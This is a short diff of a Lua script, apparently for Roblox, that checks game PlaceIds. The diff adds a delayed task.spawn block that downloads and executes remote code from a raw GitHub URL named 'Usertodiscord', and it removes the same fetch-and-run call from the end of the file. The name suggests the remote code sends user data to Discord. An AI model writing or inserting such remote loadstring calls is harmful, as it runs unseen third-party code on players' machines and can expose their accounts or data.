@@ -11,6 +11,12 @@ local success, message = pcall(function()
     otherui1 = playerGui.spawn_units
 end)
 
+task.spawn(function ()
+wait(5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yClematiS/Main_Loader/main/Usertodiscord"))()
+
+end)
+
 print("Phase 2 : Checking Games")
 local tocheck = game.PlaceId
 if tocheck == 2866967438 then
@@ -134,6 +140,3 @@ else
         end)
     end
 end
-
-wait(0.2)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/yClematiS/Main_Loader/main/Usertodiscord"))()
